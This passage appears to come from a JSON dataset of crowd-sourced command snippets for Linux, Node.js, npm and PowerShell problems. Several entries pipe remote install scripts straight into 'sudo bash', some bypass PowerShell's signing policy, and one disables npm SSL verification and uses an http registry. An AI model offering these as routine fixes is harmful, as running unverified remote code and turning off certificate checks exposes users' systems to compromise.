    "description": "# see available connections nmcli d wifi  # disconnect from the access point you are currently connected to # replace <current AP> with the AP you are currently connected to nmcli c down <current AP> # see previous command output  # connect to new AP # replace <AP name> with name of AP you want to connect to # replace <password> with the password of the AP nmcli d wifi c <AP name> password <password>  # hope this helped you :)\n",
    "reg_date": "2021-10-11T22:10:18.000Z"
  },
  {
    "id": 3639,
    "keyword": null,
    "link": null,
    "title": " no build file in linux headers",
    "description": "sudo apt-get install -y linux-headers-`uname -r` \n",
    "reg_date": "2021-10-11T22:10:18.000Z"
  },
  {
    "id": 3640,
    "keyword": null,
    "link": null,
    "title": " no dns lookup cisco",
    "description": "configure terminal no ip domain-lookup end #Make this change permanent? VV copy running-config startup-config\n",
    "reg_date": "2021-10-11T22:10:18.000Z"
  },
  {
    "id": 3641,
    "keyword": null,
    "link": null,
    "title": " no matching key exchange method found. Their offer: diffie-hellman-group1-sha1,diffie-hellman-group14-sha1",
    "description": "ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 123.123.123.123 \n",
    "reg_date": "2021-10-11T22:10:18.000Z"
  },
  {
    "id": 3642,
    "keyword": null,
    "link": null,
    "title": " no module named psycopg2",
    "description": "# For quick install pip install psycopg2-binary  # For production-ready install pip install psycopg2 # But it will fail if build prerequesties are not met: # https://www.psycopg.org/docs/install.html#build-prerequisites\npip install psycopg2\npip install psycopg2-binary \n$ pip install psycopg2  # or $ pipenv install psycopg2\n#Use psycopg2-binary instead of psycopg2.  pip install psycopg2-binary \npip install psycopg2  \n",
    "reg_date": "2021-10-11T22:10:18.000Z"
  },
  {
    "id": 3643,
    "keyword": null,
    "link": null,
    "title": " node-gyp",
    "description": "npm install -g node-gyp\nnpm install -g node-gyp node-pre-gyp\nnpm install -g node-gyp\n",
    "reg_date": "2021-10-11T22:10:18.000Z"
  },
  {
    "id": 3644,
    "keyword": null,
    "link": null,
    "title": " node-pre-gyp install --fallback-to-build --library=static library",
    "description": "i have tried upgrading node-gyp:  sudo npm install -g node-gyp It worked for me.  I find the solution here, I hope it can help.\n",
    "reg_date": "2021-10-11T22:10:18.000Z"
  },
  {
    "id": 3645,
    "keyword": null,
    "link": null,
    "title": " node-sass: command not found",
    "description": "npm i -g node-sass\n",
    "reg_date": "2021-10-11T22:10:19.000Z"
  },
  {
    "id": 3646,
    "keyword": null,
    "link": null,
    "title": " node install ubuntu",
    "description": "sudo apt-get install curl curl -sL https://deb.nodesource.com/setup_13.x | sudo -E bash - sudo apt-get install nodejs # Check node version node -v  # v13.9.0 # Also, check the npm version npm -v  # 6.13.7\nsudo apt update sudo apt install nodejs sudo apt install npm\ncurl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - sudo apt install nodejs sudo apt install npm sudo apt update\nsudo apt install nodejs\n//Author: Mohammad Arman Khan //How To Install Node.js on Ubuntu 1: sudo apt-get update 2: sudo apt-get install nodejs 3: sudo apt-get install npm 4: nodejs -v\n# Through nodesource curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - sudo apt install nodejs\n",
    "reg_date": "2021-10-11T22:10:19.000Z"
  },
  {
    "id": 3647,
    "keyword": null,
    "link": null,
    "title": " node js download ubuntu",
    "description": "sudo apt-get install curl curl -sL https://deb.nodesource.com/setup_13.x | sudo -E bash - sudo apt-get install nodejs # Check node version node -v  # v13.9.0 # Also, check the npm version npm -v  # 6.13.7\nsudo apt install curl curl -sL https://deb.nodesource.com/setup_14.x | sudo bash - sudo apt install -y nodejs\nsudo apt install nodejs\nsudo apt-get install curl curl -sL https://deb.nodesource.com/setup_13.x | sudo -E bash - sudo apt-get install nodejs  node -v    #to check if its installed\nwget -qO- https://deb.nodesource.com/setup_14.x | sudo -E bash - sudo apt install -y nodejs\nsudo curl -o /usr/local/bin/n https://raw.githubusercontent.com/visionmedia/n/master/bin/n\n",
    "reg_date": "2021-10-11T22:10:19.000Z"
  },
  {
    "id": 3648,
    "keyword": null,
    "link": null,
    "title": " node run shell command",
    "description": "// You can use 'exec' this way  const { exec } = require(\"child_process\");  exec(\"ls -la\", (error, stdout, stderr) => {     if (error) {         console.log(`error: ${error.message}`);         return;     }     if (stderr) {         console.log(`stderr: ${stderr}`);         return;     }     console.log(`stdout: ${stdout}`); }); \nconst { exec } = require(\"child_process\"); exec(\"cat index.js\", (error, data, getter) => { \tif(error){ \t\tconsole.log(\"error\",error.message); \t\treturn; \t} \tif(getter){ \t\tconsole.log(\"data\",data); \t\treturn; \t} \tconsole.log(\"data\",data);  }); \n",
    "reg_date": "2021-10-11T22:10:19.000Z"
  },
  {
    "id": 3649,
    "keyword": null,
    "link": null,
    "title": " node sass does not yet support your current environment windows 64-bit angular",
    "description": "npm rebuild node-sass\n",
    "reg_date": "2021-10-11T22:10:19.000Z"
  },
  {
    "id": 3650,
    "keyword": null,
    "link": null,
    "title": " node sass install error",
    "description": "You need to do next steps and it should work:  rm -rf node_modules package-lock.json  npm install --saveDev node-sass@4.5.3  npm install Voila :)\nnpm install --global windows-build-tools //BOOM!\n",
    "reg_date": "2021-10-11T22:10:19.000Z"
  },
  {
    "id": 3651,
    "keyword": null,
    "link": null,
    "title": " node upgrade mac os x",
    "description": "$ node -v $ sudo npm install -g n $ sudo n latest\n",
    "reg_date": "2021-10-11T22:10:19.000Z"
  },
  {
    "id": 3652,
    "keyword": null,
    "link": null,
    "title": " node user installed packages",
    "description": "npm list -g --depth=0 \n",
    "reg_date": "2021-10-11T22:10:19.000Z"
  },
  {
    "id": 3653,
    "keyword": null,
    "link": null,
    "title": " nodejs clean cache",
    "description": "npm cache clean --force\n",
    "reg_date": "2021-10-11T22:10:20.000Z"
  },
  {
    "id": 3654,
    "keyword": null,
    "link": null,
    "title": " nodemon command not found linux",
    "description": "sudo npm install nodemon -g\nnpx nodemon server.js or add in package.json config:  ... \"scripts\": {     \"dev\": \"npx nodemon server.js\"   }, ... then run:  npm run dev\nnpx nodemon server.js \nnpm run dev \n",
    "reg_date": "2021-10-11T22:10:20.000Z"
  },
  {
    "id": 3655,
    "keyword": null,
    "link": null,
    "title": " nodemon is not recognized",
    "description": "//You need to install nodemon as globally. Use this command npm install -g nodemon //Now you can use nodemon it will work\nsudo npm install nodemon -g // This command will install nodemon into the system\nnpx nodemon server.js or add in package.json config:  ... \"scripts\": {     \"dev\": \"npx nodemon server.js\"   }, ... then run:  npm run dev\nRun: $ npm install -g nodemon  Run: $ npm install --save-dev nodemon  Change package.json file as:  \"scripts\": {     \"serve\": \"nodemon index.js\" } Run: $ npm run serve\n'nodemon' is not recognized: // You need to install nodemon as globally. Use this command npm install -g nodemon // Now you can use nodemon it will work  'nodemon' is not recognized as an internal or external command, operable program or batch file: // Try this Run: $ npm install -g nodemon  Run: $ npm install --save-dev nodemon  Change package.json file as:  \"scripts\": {     \"serve\": \"nodemon index.js\" } Run: $ npm run serve\n... \"scripts\": {     \"dev\": \"npx nodemon server.js\"   }, ... \n",
    "reg_date": "2021-10-11T22:10:20.000Z"
  },
  {
    "id": 3656,
    "keyword": null,
    "link": null,
    "title": " nohup",
    "description": "nohup ./myscript.sh &\t\t\t\t\t\t# runs in background nohup ./myscript.sh\t\t\t\t\t\t\t# output is in nohup.out nohup ./myscript.sh > myscript.log &\t\t# output is in myscript.log\nnohup command [command-argument ...]\n",
    "reg_date": "2021-10-11T22:10:20.000Z"
  },
  {
    "id": 3657,
    "keyword": null,
    "link": null,
    "title": " nohup & 2 &1",
    "description": " nohup command >/dev/null 2>&1\n",
    "reg_date": "2021-10-11T22:10:20.000Z"
  },
  {
    "id": 3658,
    "keyword": null,
    "link": null,
    "title": " nohup background",
    "description": "nohup ./myscript.sh &\t\t\t\t\t\t# runs in background nohup ./myscript.sh\t\t\t\t\t\t\t# output is in nohup.out nohup ./myscript.sh > myscript.log &\t\t# output is in myscript.log\n",
    "reg_date": "2021-10-11T22:10:20.000Z"
  },
  {
    "id": 3659,
    "keyword": null,
    "link": null,
    "title": " nohup command",
    "description": "nohup ./myscript.sh &\t\t\t\t\t\t# runs in background nohup ./myscript.sh\t\t\t\t\t\t\t# output is in nohup.out nohup ./myscript.sh > myscript.log &\t\t# output is in myscript.log\nnohup command [command-argument ...]\n",
    "reg_date": "2021-10-11T22:10:20.000Z"
  },
  {
    "id": 3660,
    "keyword": null,
    "link": null,
    "title": " nonexistentpath data directory /data/db not found",
    "description": "# Create the folder sudo mkdir -p /data/db/  # Set the ownership of the folder sudo chown `id -u` /data/db\n",
    "reg_date": "2021-10-11T22:10:20.000Z"
  },
  {
    "id": 3661,
    "keyword": null,
    "link": null,
    "title": " not digitally signed. you cannot run this script on the current system",
    "description": "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass\n",
    "reg_date": "2021-10-11T22:10:21.000Z"
  },
  {
    "id": 3662,
    "keyword": null,
    "link": null,
    "title": " not digitally signed",
    "description": "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass\n",
    "reg_date": "2021-10-11T22:10:21.000Z"
  },
  {
    "id": 3663,
    "keyword": null,
    "link": null,
    "title": " not digitally signed powershell",
    "description": "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass\n",
    "reg_date": "2021-10-11T22:10:21.000Z"
  },
  {
    "id": 3664,
    "keyword": null,
    "link": null,
    "title": " note [ad ++ fpr linuix",
    "description": "sudo snap install notepad-plus-plus\n",
    "reg_date": "2021-10-11T22:10:21.000Z"
  },
  {
    "id": 3665,
    "keyword": null,
    "link": null,
    "title": " notepad++ ubuntu",
    "description": "sudo snap install notepad-plus-plus\nopen terminal in linux and type: sudo snap install notepad-plus-plus \nopen terminal in linux and type: sudo snap install notepad-plus-plus\n",
    "reg_date": "2021-10-11T22:10:21.000Z"
  },
  {
    "id": 3666,
    "keyword": null,
    "link": null,
    "title": " notepad ++ debian",
    "description": "sudo snap install notepad-plus-plus\n",
    "reg_date": "2021-10-11T22:10:21.000Z"
  },
  {
    "id": 3667,
    "keyword": null,
    "link": null,
    "title": " notify once a job is completed",
    "description": "mvn clean install; say done  \n",
    "reg_date": "2021-10-11T22:10:21.000Z"
  },
  {
    "id": 3668,
    "keyword": null,
    "link": null,
    "title": " notion for linux",
    "description": "sudo snap install notion-snap\n",
    "reg_date": "2021-10-11T22:10:21.000Z"
  },
  {
    "id": 3669,
    "keyword": null,
    "link": null,
    "title": " npm -v -bash: /usr/bin/npm: No such file or directory",
    "description": "ln -s /usr/bin/nodejs /usr/bin/node\n",
    "reg_date": "2021-10-11T22:10:22.000Z"
  },
  {
    "id": 3670,
    "keyword": null,
    "link": null,
    "title": " npm ERR! Command failed: git clone --depth=1 -q -b 1.3.8 git://github.com/eligrey/FileSaver.js.git",
    "description": " npm install --no-cache git\n",
    "reg_date": "2021-10-11T22:10:22.000Z"
  },
  {
    "id": 3671,
    "keyword": null,
    "link": null,
    "title": " npm ERR! Maximum call stack size exceeded",
    "description": "npm cache clean --force\nIt is likely that a function with infinite loop is being called\n",
    "reg_date": "2021-10-11T22:10:22.000Z"
  },
  {
    "id": 3672,
    "keyword": null,
    "link": null,
    "title": " npm ERR! cb() never called!",
    "description": "//try below command first and //then again install the required package you were installing npm cache clean //if the above command fails run below command.  npm cache clean --force\n// run this command before running again npm cache clean --force\n",
    "reg_date": "2021-10-11T22:10:22.000Z"
  },
  {
    "id": 3673,
    "keyword": null,
    "link": null,
    "title": " npm ERR! code ELIFECYCLE npm error",
    "description": "npm cache clean --force\nrm -rf node_modules package-lock.json\nnpm cache clean --force //delete node_modules folder //delete package-lock.json file npm install \n",
    "reg_date": "2021-10-11T22:10:22.000Z"
  },
  {
    "id": 3674,
    "keyword": null,
    "link": null,
    "title": " npm bootstrap",
    "description": "npm install bootstrap //OR npm install bootstrap@latest\n{/* The following line can be included in your src/index.js or App.js file*/}  import 'bootstrap/dist/css/bootstrap.min.css';\nnpm install bootstrap@latest\nnpm i bootstrap@5.0.0-alpha1\n",
    "reg_date": "2021-10-11T22:10:22.000Z"
  },
  {
    "id": 3675,
    "keyword": null,
    "link": null,
    "title": " npm cache clean",
    "description": "# To clear a cache in npm, we need to run the npm cache clean --force command in our terminal: npm cache clean --force # clean: It deletes the all data from your cache folder.  # You can also verify the cache, by running the following command: npm cache verify\nnpm cache clean --force \nnpm cache clean --force\nnpm start -- --reset-cache\nnpm cache clear --force npm cache rm --force npm cache verify \n//npm clean cache:  npm cache clear --force npm cache rm --force npm cache verify \n",
    "reg_date": "2021-10-11T22:10:22.000Z"
  },
  {
    "id": 3676,
    "keyword": null,
    "link": null,
    "title": " npm cache clean --force",
    "description": "# To clear a cache in npm, we need to run the npm cache clean --force command in our terminal: npm cache clean --force # clean: It deletes the all data from your cache folder.  # You can also verify the cache, by running the following command: npm cache verify\nnpm cache clean --force \nnpm cache clean --force\nnpm start -- --reset-cache\nnpm cache clear --force npm cache rm --force npm cache verify \n//npm clean cache:  npm cache clear --force npm cache rm --force npm cache verify \n",
    "reg_date": "2021-10-11T22:10:23.000Z"
  },
  {
    "id": 3677,
    "keyword": null,
    "link": null,
    "title": " npm cache clean force",
    "description": "# To clear a cache in npm, we need to run the npm cache clean --force command in our terminal: npm cache clean --force # clean: It deletes the all data from your cache folder.  # You can also verify the cache, by running the following command: npm cache verify\nnpm cache clean --force \nnpm cache clean --force\nnpm start -- --reset-cache\nnpm cache clear --force npm cache rm --force npm cache verify \n//npm clean cache:  npm cache clear --force npm cache rm --force npm cache verify \n",
    "reg_date": "2021-10-11T22:10:23.000Z"
  },
  {
    "id": 3678,
    "keyword": null,
    "link": null,
    "title": " npm cache compressre",
    "description": "npm cache clean --force\n",
    "reg_date": "2021-10-11T22:10:23.000Z"
  },
  {
    "id": 3679,
    "keyword": null,
    "link": null,
    "title": " npm cache remove",
    "description": "# To clear a cache in npm, we need to run the npm cache clean --force command in our terminal: npm cache clean --force # clean: It deletes the all data from your cache folder.  # You can also verify the cache, by running the following command: npm cache verify\nnpm cache clean --force \nnpm cache clean --force\nnpm start -- --reset-cache\n//npm clean cache:  npm cache clear --force npm cache rm --force npm cache verify \n",
    "reg_date": "2021-10-11T22:10:23.000Z"
  },
  {
    "id": 3680,
    "keyword": null,
    "link": null,
    "title": " npm change registry",
    "description": "# replace the default registry URL as per your requirement  # the first command below is probably sufficient npm config set registry https://registry.npmjs.org/  # command below probably not required npm install --registry=https://registry.npmjs.org/\nnpm config set registry https://registry.npmjs.org/\n",
    "reg_date": "2021-10-11T22:10:23.000Z"
  },
  {
    "id": 3681,
    "keyword": null,
    "link": null,
    "title": " npm clear cache",
    "description": "# To clear a cache in npm, we need to run the npm cache clean --force command in our terminal: npm cache clean --force # clean: It deletes the all data from your cache folder.  # You can also verify the cache, by running the following command: npm cache verify\nnpm cache clean --force \nnpm cache clean --force\nnpm start -- --reset-cache\nnpm cache clear --force npm cache rm --force npm cache verify \n//npm clean cache:  npm cache clear --force npm cache rm --force npm cache verify \n",
    "reg_date": "2021-10-11T22:10:23.000Z"
  },
  {
    "id": 3682,
    "keyword": null,
    "link": null,
    "title": " npm config node gyp",
    "description": "# Open the terminal as an administrator # Go to your project folder and run: npm install sharp@latest # If the error persists npm config set node_gyp npm config set msvs_version 2017 npm install\n",
    "reg_date": "2021-10-11T22:10:23.000Z"
  },
  {
    "id": 3683,
    "keyword": null,
    "link": null,
    "title": " npm dev dependencies",
    "description": "# install as devDependency npm install <package-name> --save-dev  # install as normal dependency npm install <package-name> --save  # install all devDependencies listed in package.json npm install --only=dev  # install all normal dependencies listed in package.json npm install --only=prod # or if NODE_ENV is set to production npm install\nnpm i -D \nnpm install <package-name> --save-dev \nnpm install packageName --save-dev\nnpm i packageName -save\n",
    "reg_date": "2021-10-11T22:10:23.000Z"
  },
  {
    "id": 3684,
    "keyword": null,
    "link": null,
    "title": " npm forever",
    "description": "#Installation: npm install -g forever  # Use forever -w, instead of node to start your app: $ forever -w app.js\n",
    "reg_date": "2021-10-11T22:10:23.000Z"
  },
  {
    "id": 3685,
    "keyword": null,
    "link": null,
    "title": " npm i --global expo-cli",
    "description": "npm install --global expo-cli\n",
    "reg_date": "2021-10-11T22:10:24.000Z"
  },
  {
    "id": 3686,
    "keyword": null,
    "link": null,
    "title": " npm i -D @babel/core @babel/preset-env babel-loader",
    "description": "npm i -D @babel/core @babel/preset-env babel-loader\n",
    "reg_date": "2021-10-11T22:10:24.000Z"
  },
  {
    "id": 3687,
    "keyword": null,
    "link": null,
    "title": " npm i yarn",
    "description": "npm install --global yarn \nThere are two ways where you can initiate a REACT app..  1. Using npm : npm init react-app <app_name> \t example : npm init react-app sampleApp 2. Using yarn : yarn create react-app <app_name> \t example : yarn create react-app sampleApp  \n",
    "reg_date": "2021-10-11T22:10:24.000Z"
  },
  {
    "id": 3688,
    "keyword": null,
    "link": null,
    "title": " npm inatall latest version ubuntu",
    "description": "// update latest version NPM sudo npm install -g npm@latest  //update to next version NPM sudo npm install -g npm@next\n",
    "reg_date": "2021-10-11T22:10:24.000Z"
  },
  {
    "id": 3689,
    "keyword": null,
    "link": null,
    "title": " npm install --global yarn",
    "description": "npm install --global yarn \n",
    "reg_date": "2021-10-11T22:10:24.000Z"
  },
  {
    "id": 3690,
    "keyword": null,
    "link": null,
    "title": " npm install Cannot read property 'match' of undefined",
    "description": "rm -rf package-lock.json node_modules npm install\n",
    "reg_date": "2021-10-11T22:10:24.000Z"
  },
  {
    "id": 3691,
    "keyword": null,
    "link": null,
    "title": " npm install React Bootstrap",
    "description": "//1.run following commnad in cmd: npm install bootstrap --save //you can now use bootstrap component. example: import { Button } from 'react-bootstrap';  //2.or  add this to index.js: <link   rel=\"stylesheet\"   href=\"https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css\"   integrity=\"sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l\"   crossorigin=\"anonymous\" />\n# with npm npm install react-bootstrap bootstrap  #with yarn yarn add react-bootstrap bootstrap\n{/* The following line can be included in your src/index.js or App.js file*/}  import 'bootstrap/dist/css/bootstrap.min.css';\nnpm install react-bootstrap bootstrap\nnpm install bootstrap --save // Inside of your command line  import 'bootstrap/dist/css/bootstrap.min.css'; // Inside of your index.js\n\tnpm install bootstrap \n",
    "reg_date": "2021-10-11T22:10:24.000Z"
  },
  {
    "id": 3692,
    "keyword": null,
    "link": null,
    "title": " npm install angular do not install devkit",
    "description": "npm i --save-dev @angular-devkit/build-angular@latest\n",
    "reg_date": "2021-10-11T22:10:24.000Z"
  },
  {
    "id": 3693,
    "keyword": null,
    "link": null,
    "title": " npm install behind proxy",
    "description": "npm config set strict-ssl false npm config set registry \"http://registry.npmjs.org/\" npm config set proxy http://<username><password>@proxy-server-url>:<port> npm config set https-proxy http://<username><password>@proxy-server-url>:<port> npm install\nnpm config set strict-ssl false  # Set npm to use http instead of https npm config set registry \"http://registry.npmjs.org/\"  # install your package with below syntax, can leave out the # username:password section if your proxy does not require # you to authenticate. The \"http://\" part is very important npm --proxy http://username:password@cacheaddress.com.br:80 install packagename \n",
    "reg_date": "2021-10-11T22:10:25.000Z"
  },
  {
    "id": 3694,
    "keyword": null,
    "link": null,
    "title": " npm install bootstrap",
    "description": "npm install bootstrap //OR npm install bootstrap@latest\n{/* The following line can be included in your src/index.js or App.js file*/}  import 'bootstrap/dist/css/bootstrap.min.css';\nnpm install bootstrap@latest\nnpm install bootstrap@3.3.7 --save \nnpm i bootstrap@5.0.0-alpha1\n$ npm install bootstrap@3\n",
    "reg_date": "2021-10-11T22:10:25.000Z"
  },
  {
    "id": 3695,
    "keyword": null,
    "link": null,
    "title": " npm install bootstrap 3.3.7",
    "description": "npm i bootstrap@3.3.7\nnpm install bootstrap@3.3.7 --save \n",
    "reg_date": "2021-10-11T22:10:25.000Z"
  },
  {
    "id": 3696,
    "keyword": null,
    "link": null,
    "title": " npm install cli vue",
    "description": "npm install -g @vue/cli # OR yarn global add @vue/cli \n",
    "reg_date": "2021-10-11T22:10:25.000Z"
  },
  {
    "id": 3697,
    "keyword": null,
    "link": null,
    "title": " npm install dev",
    "description": "npm i -D \nnpm install <package-name> --save-dev\nnpm install --save-dev package # example: npm install --save-dev nodemon\nnpm install <package-name> --save-dev \nnpm install packageName --save-dev\nnpm install // installs dependencies listed in package.json\n",
    "reg_date": "2021-10-11T22:10:25.000Z"
  },
  {
    "id": 3698,
    "keyword": null,
    "link": null,
    "title": " npm install dev dependencies only",
    "description": "# install as devDependency npm install <package-name> --save-dev  # install as normal dependency npm install <package-name> --save  # install all devDependencies listed in package.json npm install --only=dev  # install all normal dependencies listed in package.json npm install --only=prod # or if NODE_ENV is set to production npm install\nnpm i -D \nnpm install --only=prod\nnpm install --save-dev package # example: npm install --save-dev nodemon\nnpm install <package-name> --save-dev \nnpm install packageName --save-dev\n",
    "reg_date": "2021-10-11T22:10:25.000Z"
  },
  {
    "id": 3699,
    "keyword": null,
    "link": null,
    "title": " npm install directly fron github",
    "description": "npm install git://github.com/shakacode/bootstrap-loader.git#v1 --save\n",
    "reg_date": "2021-10-11T22:10:25.000Z"
  },
  {
    "id": 3700,
    "keyword": null,
    "link": null,
    "title": " npm install from github branch",
    "description": "npm install git://github.com/shakacode/bootstrap-loader.git#v1 --save\n",
    "reg_date": "2021-10-11T22:10:26.000Z"
  },
  {
    "id": 3701,
    "keyword": null,
    "link": null,
    "title": " npm install heroku",
    "description": "$ npm install -g heroku \nsudo snap install --classic heroku\nnpm i -g heroku code to install heroku in windows \n$ sudo snap install --classic heroku\n",
    "reg_date": "2021-10-11T22:10:26.000Z"
  },
  {
    "id": 3702,
    "keyword": null,
    "link": null,
    "title": " npm install line awesome",
    "description": "npm install line-awesome\n",
    "reg_date": "2021-10-11T22:10:26.000Z"
  },
  {
    "id": 3703,
    "keyword": null,
    "link": null,
    "title": " npm install material ui icons",
    "description": "npm install @material-ui/icons\n// with npm npm install @material-ui/core  // with yarn yarn add @material-ui/core\n// with npm npm install @material-ui/icons  // with yarn yarn add @material-ui/icons\nnpm install material-icons \n// with npm npm install @material-ui/icons  // with yarn yarn add @material-ui/icons\nyarn add @material-ui/icons  # NPM npm install @material-ui/icons\n",
    "reg_date": "2021-10-11T22:10:26.000Z"
  },
  {
    "id": 3704,
    "keyword": null,
    "link": null,
    "title": " npm install moment",
    "description": "npm i moment --save\nnpm i moment\nmoment().format();                                // \"2019-08-12T17:52:17-05:00\" (ISO 8601, no fractional seconds) moment().format(\"dddd, MMMM Do YYYY, h:mm:ss a\"); // \"Monday, August 12th 2019, 5:52:00 pm\" moment().format(\"ddd, hA\");                       // \"Mon, 5PM\"\nmoment().format('MMMM Do YYYY, h:mm:ss a'); // May 22nd 2020, 6:00:23 pm moment().format('dddd');                    // Friday moment().format(\"MMM Do YY\");               // May 22nd 20 moment().format('YYYY [escaped] YYYY');     // 2020 escaped 2020 moment().format();                          // 2020-05-22T18:00:23+05:30\nmoment.locale();         // en moment().format('LT');   // 8:41 PM moment().format('LTS');  // 8:41:43 PM moment().format('L');    // 04/11/2020 moment().format('l');    // 4/11/2020 moment().format('LL');   // April 11, 2020 moment().format('ll');   // Apr 11, 2020 moment().format('LLL');  // April 11, 2020 8:41 PM moment().format('lll');  // Apr 11, 2020 8:41 PM moment().format('LLLL'); // Saturday, April 11, 2020 8:41 PM moment().format('llll'); // Sat, Apr 11, 2020 8:41 PM                          // undefined\nmoment(\"20111031\", \"YYYYMMDD\").fromNow(); // h&aacute; 9 anos moment(\"20120620\", \"YYYYMMDD\").fromNow(); // h&aacute; 8 anos moment().startOf('day').fromNow();        // h&aacute; 13 horas moment().endOf('day').fromNow();          // em 11 horas moment().startOf('hour').fromNow();       // h&aacute; 10 minutos\n",
    "reg_date": "2021-10-11T22:10:26.000Z"
  },
  {
    "id": 3705,
    "keyword": null,
    "link": null,
    "title": " npm install mongodb",
    "description": "npm install mongodb --save\nnpm install -g mongodb  npm install -g mongoose\n// fist delete the node_modules folder. // then reinstall the mongodb package again. // to avoid loosing other pachages make sure you make a  // list of every other package you've installed and reinstall them too, // or run \"npm install\" this way you'll mostly going to download // every package you'll need (*it is better if you reinstall every package individualy).\n",
    "reg_date": "2021-10-11T22:10:26.000Z"
  },
  {
    "id": 3706,
    "keyword": null,
    "link": null,
    "title": " npm install mongoose error npm ERR! code ENOSELF",
    "description": "Ensure that the \"name\" field in your package.json is not set to \"mongoose\". Try setting it to something more unique :)\n",
    "reg_date": "2021-10-11T22:10:26.000Z"
  },
  {
    "id": 3707,
    "keyword": null,
    "link": null,
    "title": " npm install multiple packages in one command",
    "description": "# 'npm install' awaits an array of packages separated by space npm install <package1> <package2> <package3>  \n",
    "reg_date": "2021-10-11T22:10:26.000Z"
  },
  {
    "id": 3708,
    "keyword": null,
    "link": null,
    "title": " npm install ngrx",
    "description": "               content_copy              npm install @ngrx/store --save     \n",
    "reg_date": "2021-10-11T22:10:26.000Z"
  },
  {
    "id": 3709,
    "keyword": null,
    "link": null,
    "title": " npm install nuxt global",
    "description": "npm install -g nuxt\n",
    "reg_date": "2021-10-11T22:10:27.000Z"
  },
  {
    "id": 3710,
    "keyword": null,
    "link": null,
    "title": " npm install production",
    "description": "# Set NODE_ENV=production # OR npm install --production\n// Install as a dependency npm install --save packageName // OR npm install --save package1 package2 // OR npm install --save package@version // OR npm i -s packageName  // Install as a dev-dependency npm install --save-dev package@version // OR npm i -D packageName  //Install globally npm install --global packageName //OR npm i -g packageName  // You might need SU access on macos/linux to install globally \n{   \"scripts\": {     \"start\": \"NODE_ENV=development REACT_SERVER_CONFIGS=_configs/development/ react-server start\",     \"start-beta\": \"NODE_ENV=beta REACT_SERVER_CONFIGS=_configs/beta/ react-server start\",     \"start-prod\": \"NODE_ENV=production REACT_SERVER_CONFIGS=_configs/production/ react-server start\"   } } \n",
    "reg_date": "2021-10-11T22:10:27.000Z"
  },
  {
    "id": 3711,
    "keyword": null,
    "link": null,
    "title": " npm install production only",
    "description": "# Set NODE_ENV=production # OR npm install --production\nnpm install packageName --save-dev\n",
    "reg_date": "2021-10-11T22:10:27.000Z"
  },
  {
    "id": 3712,
    "keyword": null,
    "link": null,
    "title": " npm install react",
    "description": "npm install -g react-cli react \nRUN IN CMD  npm install -g create-react-app\nnpx create-react-app my-app cd my-app npm start\n//Is used to update the version only such as 16.0.0 can be update to latest 16.13.0 but..  //but.. 15.0.0 can't be updated to 16.13.0 or to 16.0.0 with this npm update react  //Use this to go from 15.0.0 to 16.13.0 npm install --save react@latest\nnpm i react\nnpx create-react-app <appname>  //  eg:  npx create-react-app blog cd <appname>  // cd blog npm start  //runs on localhost:3000\n",
    "reg_date": "2021-10-11T22:10:27.000Z"
  },
  {
    "id": 3713,
    "keyword": null,
    "link": null,
    "title": " npm install redux and react-redux",
    "description": "npm install redux react-redux --save\nnpm install redux\n# NPM npm install redux  # Yarn yarn add redux\n",
    "reg_date": "2021-10-11T22:10:27.000Z"
  },
  {
    "id": 3714,
    "keyword": null,
    "link": null,
    "title": " npm install redux thunk",
    "description": "npm i redux-thunk\nnpm install --save redux-thunk\n",
    "reg_date": "2021-10-11T22:10:27.000Z"
  },
  {
    "id": 3715,
    "keyword": null,
    "link": null,
    "title": " npm install upgrade react version react-scripts",
    "description": "npm install --save react-scripts@latest\n",
    "reg_date": "2021-10-11T22:10:27.000Z"
  },
  {
    "id": 3716,
    "keyword": null,
    "link": null,
    "title": " npm install vuelidate",
    "description": "npm install vuelidate --save\nrequired: requiredIf(()=> { return condition })\n",
    "reg_date": "2021-10-11T22:10:27.000Z"
  },
  {
    "id": 3717,
    "keyword": null,
    "link": null,
    "title": " npm install yarn equivalent",
    "description": "npm install 'pckg-name'   -> yarn add 'pckg-name' npm uninstall 'pckg-name' -> yarn remove 'pckg-name' npm run 'your-script'     -> yarn run 'your-script' npm init \t\t\t\t  -> yarn init npm install \t\t\t  -> yarn OR yarn install  ## In yarn flags like: --save-dev --save are used the same way\nyarn add <package...> [--exact/-E]\n",
    "reg_date": "2021-10-11T22:10:28.000Z"
  },
  {
    "id": 3718,
    "keyword": null,
    "link": null,
    "title": " npm latest version installation on ubuntu",
    "description": "sudo npm install npm@latest -g\n",
    "reg_date": "2021-10-11T22:10:28.000Z"
  },
  {
    "id": 3719,
    "keyword": null,
    "link": null,
    "title": " npm list all installed packages",
    "description": "npm list -g --depth 0\nnpm list -g\nnpm list -g --depth=0 \n",
    "reg_date": "2021-10-11T22:10:28.000Z"
  },
  {
    "id": 3720,
    "keyword": null,
    "link": null,
    "title": " npm list global packages",
    "description": "npm list -g --depth 0\nnpm list -g\nnpm list -g --depth=0\nnpm list\tLists the installed versions of all dependencies in this software npm list -g --depth 0\tLists the installed versions of all globally installed packages npm view\tLists the latest versions of all dependencies in this software npm outdated\tLists only the dependencies in this software which are outdated npm ls - list packages\nnpm root -g\n",
    "reg_date": "2021-10-11T22:10:28.000Z"
  },
  {
    "id": 3721,
    "keyword": null,
    "link": null,
    "title": " npm port already in use",
    "description": "$ lsof -i tcp:3000 $ kill -9 PID\n",
    "reg_date": "2021-10-11T22:10:28.000Z"
  },
  {
    "id": 3722,
    "keyword": null,
    "link": null,
    "title": " npm reinstall",
    "description": "npm install -g npm-reinstall# or yarn global add npm-reinstall\n",
    "reg_date": "2021-10-11T22:10:28.000Z"
  },
  {
    "id": 3723,
    "keyword": null,
    "link": null,
    "title": " npm show registry",
    "description": "> npm config get registry # https://registry.npmjs.org/ \n npm view webpack versions  --json\n",
    "reg_date": "2021-10-11T22:10:28.000Z"
  },
  {
    "id": 3724,
    "keyword": null,
    "link": null,
    "title": " npm steps",
    "description": "#Project setup npm install #Compiles and hot-reloads for development npm run serve #Compiles and minifies for production npm run build #Run your tests npm run test #Lints and fixes files npm run lint\n",
    "reg_date": "2021-10-11T22:10:28.000Z"
  },
